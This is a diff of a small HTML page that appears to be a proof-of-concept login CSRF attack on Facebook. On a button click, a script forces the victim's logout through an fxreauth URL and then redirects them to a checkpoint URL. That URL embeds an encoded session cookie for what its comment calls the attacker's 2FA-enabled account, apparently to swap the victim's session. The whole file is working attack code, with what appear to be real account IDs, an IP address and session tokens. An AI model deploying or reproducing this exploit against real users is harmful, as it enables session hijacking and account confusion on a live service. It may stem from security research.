@@ -5,18 +5,18 @@
   <script>
     function handleClick() {
       // Open in new tab
-      window.open('https://www.facebook.com/fxreauth/?app_id=1217981644879628&etoken=test&account_id=100033825612932&force_logout=1', '_blank');
+      window.open('https://www.facebook.com/fxreauth/?app_id=1217981644879628&etoken=test&account_id=61559852429573&force_logout=1', '_blank');  //LOGOUT CSRF
 
-      // Wait for 2 seconds, then redirect current tab
+      // Wait for 2 seconds, then replace  current tab
       setTimeout(function() {
-        window.location.replace('https://www.facebook.com');
-      }, 2000); // 2000 ms = 2 seconds
+        window.location.replace('https://www.facebook.com/checkpoint/start/?ip=2409%3A40f4%3A10fb%3Aa53a%3Ae4ef%3A1893%3A3bc7%3A2612&cookie=%7B%22u%22%3A61576813658350%2C%22t%22%3A1752753795%2C%22step%22%3A0%2C%22n%22%3A%22SEn0TSPLUGA%3D%22%2C%22inst%22%3A122102075528893788%2C%22f%22%3A193593390684083%2C%22st%22%3A%22p%22%2C%22aid%22%3Anull%2C%22ca%22%3Anull%2C%22la%22%3A%22%22%2C%22ta%22%3A%221752753797.ch.s%3Apw.tDBFAiA1ALQzf-hkfZ51joAcltJAkDhW4yXALwLaAoiEpV130gIhAMcjIOvEl8niWNQQIK6__v2H5-2gxG-tCNK6DBxkd3U2%22%2C%22tfvaid%22%3Anull%2C%22tfvasec%22%3Anull%2C%22sat%22%3Anull%2C%22idg%22%3Afalse%2C%22cidue%22%3A%22%22%2C%22tfuln%22%3Anull%2C%22tfvri%22%3Anull%2C%22ct%22%3Anull%2C%22s%22%3A%22AWXwqaD_LnuGd0eRHDU%22%2C%22cs%22%3A%5B%5D%2C%22mdcr%22%3A%22AFSByESB-edTlzu01yFaVdI%22%2C%22dc%22%3A%22YOZ4aOmtQQYf5FPEfnd4GVk4%22%7D&next=https%3A%2F%2Fwww.messenger.com%2F&hash=AWUtDMUPwvHfakCoYio'); //LOGIN Attackers 2fa Enabled Account
+      }, 2000);// 2 seconds
     }
   </script>
 </head>
 <body>
 
-  <button onclick="handleClick()">CSRFFB</button>
+  <button onclick="handleClick()">REPLACE FB DATR</button>
 
 </body>
 </html>
